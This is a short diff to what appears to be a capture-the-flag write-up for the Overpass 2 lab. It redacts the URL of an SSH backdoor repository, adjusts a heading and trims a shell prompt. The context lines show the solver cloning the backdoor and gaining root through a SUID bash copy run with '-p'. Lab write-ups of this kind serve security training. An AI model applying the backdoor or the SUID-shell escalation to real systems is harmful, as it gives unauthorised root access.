@@ -127,7 +127,7 @@ In one of the previous questions we found the URL for the backdoor being used by
 Let's grab the files:
 
 ```text
-root@kali:/home/kali/thm/overpass2# git clone https://github.com/NinjaJc01/ssh-backdoor
+root@kali:/home/kali/thm/overpass2# git clone https://github.com/<HIDDEN>
 Cloning into 'ssh-backdoor'...
 remote: Enumerating objects: 18, done.
 remote: Counting objects: 100% (18/18), done.
@@ -178,7 +178,7 @@ func passwordHandler(_ ssh.Context, password string) bool {
 }
 ```
 
-### Question 2.3
+## Question 2.3
 
 Now we need to find the hash that the hacker used.
 
@@ -480,7 +480,6 @@ james@overpass-production:/home/james$ ./.suid_bash -p
 root
 .suid_bash-4.4# cat /root/root.txt 
 <HIDDEN>
-.suid_bash-4.4# 
 ```
 
 All done. See you next time.
